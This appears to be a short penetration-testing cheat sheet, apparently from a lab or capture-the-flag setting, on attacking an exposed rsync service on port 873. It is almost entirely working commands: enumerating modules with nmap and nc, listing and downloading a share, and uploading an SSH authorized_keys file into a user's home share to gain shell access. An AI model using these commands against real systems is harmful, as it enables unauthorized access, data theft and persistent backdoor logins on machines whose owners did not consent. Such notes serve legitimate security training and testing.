# RSync
-------
port 873

Listing shares using nmap
```bash
nmap -sV --script "rsync-list-modules" -p 873 192.168.121.126
```

Listing shares using nc
```bash
❯ nc -vn 192.168.121.126 873                   
Connection to 192.168.121.126 873 port [tcp/*] succeeded!
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
fox            	fox home
@RSYNCD: EXIT

❯ nc -vn 192.168.121.126 873                                                               
Connection to 192.168.121.126 873 port [tcp/*] succeeded!
@RSYNCD: 31.0
@RSYNCD: 31.0
fox
@RSYNCD: OK
```

Using rsync utility
listing files and directories in the share
```bash
rsync -av --list-only rsync://192.168.121.126/fox
```

downloading the share
```bash
rsync -av rsync://192.168.121.126:873/fox ./shared
```

uploading ssh keys (authorized_keys) via rsync
```bash
# after generating a public key, rename it to authorized_keys
rsync -av /tmp/.ssh rsync://fox@192.168.121.126/fox
```
-----------
